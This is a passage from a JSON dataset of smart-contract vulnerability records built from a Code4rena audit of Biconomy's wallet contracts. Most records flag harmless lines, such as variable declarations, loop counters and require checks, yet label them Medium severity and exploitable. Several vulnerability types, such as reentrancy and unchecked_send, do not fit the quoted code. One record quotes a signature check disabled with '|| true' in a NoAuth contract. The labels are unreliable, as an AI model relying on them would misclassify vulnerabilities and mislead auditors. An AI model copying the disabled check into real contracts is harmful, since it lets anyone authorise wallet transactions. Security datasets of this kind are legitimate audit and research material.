    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.435,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::51 => address public owner;\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::51 => address public owner;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::51 => address public owner; 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::51 => address public owner;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.207,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::468 => for (uint i = 0; i < dest.length;) {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::458 => for (uint i = 0; i < dest.length;) {\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::468 => for (uint i = 0; i < dest.length;) { 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::458 => for (uint i = 0; i < dest.length;) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.239,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/libs/Strings.sol::56 => for (uint256 i = 2 * length + 1; i > 1; --i) {\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/libs/Strings.sol::56 => for (uint256 i = 2 * length + 1; i > 1; --i) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.126,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::77 => require(msg.sender == owner, \"Smart Account:: Sender is not authorized\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::110 => require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::128 => require(_newEntryPoint != address(0), \"Smart Account:: new entry point address cannot be zero\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountFactory.sol::18 => require(_baseImpl != address(0), \"base wallet address can not be zero\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::77 => require(msg.sender == owner, \"Smart Account:: Sender is not authorized\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::110 => require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::128 => require(_newEntryPoint != address(0), \"Smart Account:: new entry point address cannot be zero\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/common/Singleton.sol::13 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));\n2023-01-biconomy-main/contracts/smart-contract-wallet/libs/MultiSend.sol::27 => require(address(this) != multisendSingleton, \"MultiSend should only be called via delegatecall\");\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::77 => require(msg.sender == owner, \"Smart Account:: Sender is not authorized\"); 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::110 => require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\"); 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::128 => require(_newEntryPoint != address(0), \"Smart Account:: new entry point address cannot be zero\"); 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountFactory.sol::18 => require(_baseImpl != address(0), \"base wallet address can not be zero\"); 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::77 => require(msg.sender == owner, \"Smart Account:: Sender is not authorized\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 11,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::102 => return _entryPoint;\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::102 => return _entryPoint;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::102 => return _entryPoint; 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::102 => return _entryPoint;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.205,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::234 => uint256 payment = 0;\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::310 => uint256 i = 0;\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::468 => for (uint i = 0; i < dest.length;) {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::234 => uint256 payment = 0;\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::305 => uint256 i = 0;\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::458 => for (uint i = 0; i < dest.length;) {\n2023-01-biconomy-main/contracts/smart-contract-wallet/base/ModuleManager.sol::119 => uint256 moduleCount = 0;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::234 => uint256 payment = 0; 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::310 => uint256 i = 0; 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::468 => for (uint i = 0; i < dest.length;) { 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::234 => uint256 payment = 0; 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::305 => uint256 i = 0;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 9,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.749,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/base/ModuleManager.sol::34 => require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/base/ModuleManager.sol::49 => require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/base/ModuleManager.sol::68 => require(msg.sender != SENTINEL_MODULES && modules[msg.sender] != address(0), \"BSA104\");\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/base/ModuleManager.sol::34 => require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\"); 2023-01-biconomy-main/contracts/smart-contract-wallet/base/ModuleManager.sol::49 => require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\"); 2023-01-biconomy-main/contracts/smart-contract-wallet/base/ModuleManager.sol::68 => require(msg.sender != SENTINEL_MODULES && modules[msg.sender] != address(0), \"BSA104\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.483,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::53 => // uint96 private _nonce; //changed to 2D nonce below\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::307 => uint8 v;\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountFactory.sol::34 => bytes32 salt = keccak256(abi.encodePacked(_owner, address(uint160(_index))));\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountFactory.sol::35 => bytes memory deploymentData = abi.encodePacked(type(Proxy).creationCode, uint(uint160(_defaultImpl)));\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountFactory.sol::54 => bytes memory deploymentData = abi.encodePacked(type(Proxy).creationCode, uint(uint160(_defaultImpl)));\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountFactory.sol::68 => function getAddressForCounterfactualWallet(address _owner, uint _index) external view returns (address _wallet) {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountFactory.sol::69 => bytes memory code = abi.encodePacked(type(Proxy).creationCode, uint(uint160(_defaultImpl)));\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountFactory.sol::70 => bytes32 salt = keccak256(abi.encodePacked(_owner, address(uint160(_index))));\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountFactory.sol::72 => _wallet = address(uint160(uint(hash)));\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::302 => uint8 v;\n2023-01-biconomy-main/contracts/smart-contract-wallet/libs/Strings.sol::13 => uint8 private constant _ADDRESS_LENGTH = 20;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::53 => // uint96 private _nonce; //changed to 2D nonce below 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::307 => uint8 v; 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountFactory.sol::34 => bytes32 salt = keccak256(abi.encodePacked(_owner, address(uint160(_index)))); 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountFactory.sol::35 => bytes memory deploymentData = abi.encodePacked(type(Proxy).creationCode, uint(uint160(_defaultImpl))); 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountFactory.sol::54 => bytes memory deploymentData = abi.encodePacked(type(Proxy).creationCode, uint(uint160(_defaultImpl)));",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 13,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/BaseSmartAccount.sol::74 => require(msg.sender == address(entryPoint()), \"account: not from EntryPoint\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::77 => require(msg.sender == owner, \"Smart Account:: Sender is not authorized\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::83 => require(msg.sender == owner || msg.sender == address(this),\"Only owner or self\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::89 => require(msg.sender == address(entryPoint()), \"wallet: not from EntryPoint\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::110 => require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::121 => require(_implementation.isContract(), \"INVALID_IMPLEMENTATION\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::128 => require(_newEntryPoint != address(0), \"Smart Account:: new entry point address cannot be zero\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::167 => require(owner == address(0), \"Already initialized\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::168 => require(address(_entryPoint) == address(0), \"Already initialized\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::169 => require(_owner != address(0),\"Invalid owner\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::170 => require(_entryPointAddress != address(0), \"Invalid Entrypoint\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::171 => require(_handler != address(0), \"Invalid Entrypoint\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::224 => require(gasleft() >= max((_tx.targetTxGas * 64) / 63,_tx.targetTxGas + 2500) + 500, \"BSA010\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::232 => require(success || _tx.targetTxGas != 0 || refundInfo.gasPrice != 0, \"BSA013\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::262 => require(success, \"BSA011\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::265 => require(transferToken(gasToken, receiver, payment), \"BSA012\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::286 => require(success, \"BSA011\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::289 => require(transferToken(gasToken, receiver, payment), \"BSA012\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::322 => require(uint256(s) >= uint256(1) * 65, \"BSA021\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::325 => require(uint256(s) + 32 <= signatures.length, \"BSA022\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::333 => require(uint256(s) + 32 + contractSignatureLen <= signatures.length, \"BSA023\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::342 => require(ISignatureValidator(_signer).isValidSignature(data, contractSignature) == EIP1271_MAGIC_VALUE, \"BSA024\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::348 => require(_signer == owner, \"INVALID_SIGNATURE\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::351 => require(_signer == owner, \"INVALID_SIGNATURE\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::450 => require(dest != address(0), \"this action will burn your funds\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::452 => require(success,\"transfer failed\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::467 => require(dest.length == func.length, \"wrong array lengths\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::491 => require(success, \"Userop Failed\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::495 => require(msg.sender == address(entryPoint()) || msg.sender == owner, \"account: not Owner or EntryPoint\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::502 => require(nonces[0]++ == userOp.nonce, \"account: invalid nonce\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::511 => require(owner == hash.recover(userOp.signature) || tx.origin == address(0), \"account: wrong signature\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountFactory.sol::18 => require(_baseImpl != address(0), \"base wallet address can not be zero\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountFactory.sol::40 => require(address(proxy) != address(0), \"Create2 call failed\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::77 => require(msg.sender == owner, \"Smart Account:: Sender is not authorized\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::83 => require(msg.sender == owner || msg.sender == address(this),\"Only owner or self\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::89 => require(msg.sender == address(entryPoint()), \"wallet: not from EntryPoint\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::110 => require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::121 => require(_implementation.isContract(), \"INVALID_IMPLEMENTATION\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::128 => require(_newEntryPoint != address(0), \"Smart Account:: new entry point address cannot be zero\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::167 => require(owner == address(0), \"Already initialized\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::168 => require(address(_entryPoint) == address(0), \"Already initialized\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::169 => require(_owner != address(0),\"Invalid owner\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::170 => require(_entryPointAddress != address(0), \"Invalid Entrypoint\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::171 => require(_handler != address(0), \"Invalid Entrypoint\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::224 => require(gasleft() >= max((_tx.targetTxGas * 64) / 63,_tx.targetTxGas + 2500) + 500, \"BSA010\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::232 => require(success || _tx.targetTxGas != 0 || refundInfo.gasPrice != 0, \"BSA013\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::262 => require(success, \"BSA011\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::265 => require(transferToken(gasToken, receiver, payment), \"BSA012\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::285 => require(success, \"BSA011\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::288 => require(transferToken(gasToken, receiver, payment), \"BSA012\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::317 => require(uint256(s) >= uint256(1) * 65, \"BSA021\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::320 => require(uint256(s) + 32 <= signatures.length, \"BSA022\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::328 => require(uint256(s) + 32 + contractSignatureLen <= signatures.length, \"BSA023\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::337 => require(ISignatureValidator(_signer).isValidSignature(data, contractSignature) == EIP1271_MAGIC_VALUE, \"BSA024\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::343 => require(_signer == owner || true, \"INVALID_SIGNATURE\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::346 => require(_signer == owner || true, \"INVALID_SIGNATURE\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::440 => require(dest != address(0), \"this action will burn your funds\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::442 => require(success,\"transfer failed\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::457 => require(dest.length == func.length, \"wrong array lengths\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::471 => revert(add(result, 32), mload(result))\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::481 => require(success, \"Userop Failed\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::484 => function _requireFromEntryPointOrOwner() internal view {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::485 => require(msg.sender == address(entryPoint()) || msg.sender == owner, \"account: not Owner or EntryPoint\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::492 => require(nonces[0]++ == userOp.nonce, \"account: invalid nonce\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::501 => require(owner == hash.recover(userOp.signature) || tx.origin == address(0), \"account: wrong signature\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/base/ModuleManager.sol::21 => require(modules[SENTINEL_MODULES] == address(0), \"BSA100\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/base/ModuleManager.sol::25 => require(execute(to, 0, data, Enum.Operation.DelegateCall, gasleft()), \"BSA000\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/base/ModuleManager.sol::34 => require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/base/ModuleManager.sol::36 => require(modules[module] == address(0), \"BSA102\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/base/ModuleManager.sol::49 => require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/base/ModuleManager.sol::50 => require(modules[prevModule] == module, \"BSA103\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/base/ModuleManager.sol::68 => require(msg.sender != SENTINEL_MODULES && modules[msg.sender] != address(0), \"BSA104\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/libs/MultiSend.sol::27 => require(address(this) != multisendSingleton, \"MultiSend should only be called via delegatecall\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/libs/Strings.sol::60 => require(value == 0, \"Strings: hex length insufficient\");\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/BaseSmartAccount.sol::74 => require(msg.sender == address(entryPoint()), \"account: not from EntryPoint\"); 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::77 => require(msg.sender == owner, \"Smart Account:: Sender is not authorized\"); 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::83 => require(msg.sender == owner || msg.sender == address(this),\"Only owner or self\"); 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::89 => require(msg.sender == address(entryPoint()), \"wallet: not from EntryPoint\"); 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::110 => require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 76,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::449 => function transfer(address payable dest, uint amount) external nonReentrant onlyOwner {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::455 => function pullTokens(address token, address dest, uint256 amount) external onlyOwner {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::460 => function execute(address dest, uint value, bytes calldata func) external onlyOwner{\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::465 => function executeBatch(address[] calldata dest, bytes[] calldata func) external onlyOwner{\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::489 => function execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::536 => function withdrawDepositTo(address payable withdrawAddress, uint256 amount) public onlyOwner {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::439 => function transfer(address payable dest, uint amount) external nonReentrant onlyOwner {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::445 => function pullTokens(address token, address dest, uint256 amount) external onlyOwner {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::450 => function execute(address dest, uint value, bytes calldata func) external onlyOwner{\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::455 => function executeBatch(address[] calldata dest, bytes[] calldata func) external onlyOwner{\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::479 => function execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::526 => function withdrawDepositTo(address payable withdrawAddress, uint256 amount) public onlyOwner {\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::449 => function transfer(address payable dest, uint amount) external nonReentrant onlyOwner { 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::455 => function pullTokens(address token, address dest, uint256 amount) external onlyOwner { 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::460 => function execute(address dest, uint value, bytes calldata func) external onlyOwner{ 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::465 => function executeBatch(address[] calldata dest, bytes[] calldata func) external onlyOwner{ 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::489 => function execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::457 => SafeERC20.safeTransfer(tokenContract, dest, amount);\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::447 => SafeERC20.safeTransfer(tokenContract, dest, amount);\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::457 => SafeERC20.safeTransfer(tokenContract, dest, amount); 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::447 => SafeERC20.safeTransfer(tokenContract, dest, amount);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.271,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
